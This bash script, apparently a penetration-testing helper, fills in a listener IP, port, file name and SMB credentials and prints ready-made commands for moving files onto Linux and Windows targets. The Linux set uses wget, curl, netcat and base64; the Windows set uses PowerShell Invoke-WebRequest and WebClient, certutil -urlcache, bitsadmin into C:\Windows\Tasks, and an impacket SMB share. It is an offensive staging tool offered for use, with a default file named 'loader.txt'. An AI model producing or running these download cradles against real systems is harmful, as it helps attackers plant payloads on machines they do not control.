#!/bin/bash
dl_help(){
pygmentize -l cmake <<eof

--------------------------------------------
 {!}w{!} Download File Builder Tool {!}w{!}
--------------------------------------------
# Help
./download_builder.sh -h

# Flag Options:
-h  || Print the help menu.
-lh || Set LHOST 0r IP-Address/Hostname of the service hosting the file.
-lp || Set LPORT 0r Port number of the service hosting the file.
-f  || Name of the File to be downloaded.
-s  || Set Share name. (for impacket-smbserver)
-u  || Service Username.
-p  || Service Password.
-o  || Return 0nly the (download methods) for a single OS-Target
	* linux || lin || l
	* windows || win || w

# Examples:
## Print formated download methods for all Operating Systems (With all default
./download_builder.sh

## Return formated download methods for a single OS target
./download_builder.sh -o linux

## Return formated download methods for a single OS with extra options than defaults
./download_builder.sh -o win -lp 1337 -lh tun0 -s shared -u admin2 -p "P@ssw0rd"
eof
exit 1
}
lin_dl_methods(){
# java
pygmentize -l cmake <<eof
------------------------------------------------------------------------------------------------------
# Linux Download Via Web-Server
------------------------------------------------------------------------------------------------------

wget http://$lhost_ip:$lport/$file
curl http://$lhost_ip:$lport/$file -o $file

# Linux NC file Transfer

nc -lvnp $lport > $file
nc $lhost_ip $lport -w3 < $file

# Linux base64 file Transfer

echo -n "<base64-enc-file>" | base64 -d > $file
------------------------------------------------------------------------------------------------------
eof
}
win_dl_methods(){
pygmentize -l cmake <<eof
------------------------------------------------------------------------------------------------------
# Windows Download Via Web-Server

curl http://$lhost_ip:$lport/$file -o $file
powershell wget "http://$lhost_ip:$lport/$file" -o "C:\\Windows\\Tasks\\$file"

powershell -c "Invoke-WebRequest -Uri 'http://$lhost_ip:$lhost/$file' -OutFile '$file'"
powershell "IEX(New-Object System.Net.WebClient).Downloadfile('http://$lhost_ip:$lport/$file','$file')"

certutil -urlcache -split -f http://$lhost_ip:$lport/$file $file
certutil -urlcache -f http://$lhost_ip:$lport/$file $file

bitsadmin /transfer n http://$lhost_ip:$lport/$file C:\\Windows\\Tasks\\$file
bitsadmin /transfer n /download http://$lhost_ip:$lport/$file C:\\Windows\\Tasks\\$file
bitsadmin /transfer n /download /priority normal http://$lhost_ip:$lport/$file C:\\Windows\\Tasks\\$file

# Download Via SMB Server
impacket-smbserver -smb2support -username "$user" -password "$pass" $share .
net use \\\\$lhost_ip\\$share /user:$lhost_ip\\$user $pass

copy \\\\$lhost_ip\\$share\\$file .\\$file
0r
powershell
cp -r .\\folder \\\\$lhost_ip\\$share\\folder
------------------------------------------------------------------------------------------------------
eof
}
lport="8000"
lhost="eth0"
file="loader.txt"
share="share"
user="admin"
pass="P@ssw0rd"
os=''
while [[ "$#" -gt 0 ]]
do
	case "$1" in
		-lp) lport=$2;;
		-lh) lhost=$2;;
		-f) file=$2;;
		-s) share=$2;;
		-u) user=$2;;
		-p) pass=$2;;
		-o) os=$2;;
		-h) dl_help
	esac
	shift
done
ip_regex='[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

if [[ ! $lhost =~ $ip_regex ]]; then
	if ip addr show $lhost &>/dev/null;then
		lhost_ip=$(ip addr show $lhost | grep -Po 'inet \K[\d.]+')
	else
		echo -n "Error Interface Name Of $lhost Not Found..."
		exit 1
	fi
else
	lhost_ip=$(echo -n $lhost)
fi
if [[ $os == 'linux' ]]||[[ $os == 'lin' ]]||[[ $os == 'l' ]];then
	lin_dl_methods
	exit 0
elif [[ $os == 'windows' ]]||[[ $os == 'win' ]]||[[ $os == 'w' ]];then
	win_dl_methods
	exit 0
else
	lin_dl_methods
	win_dl_methods
	exit 0
fi
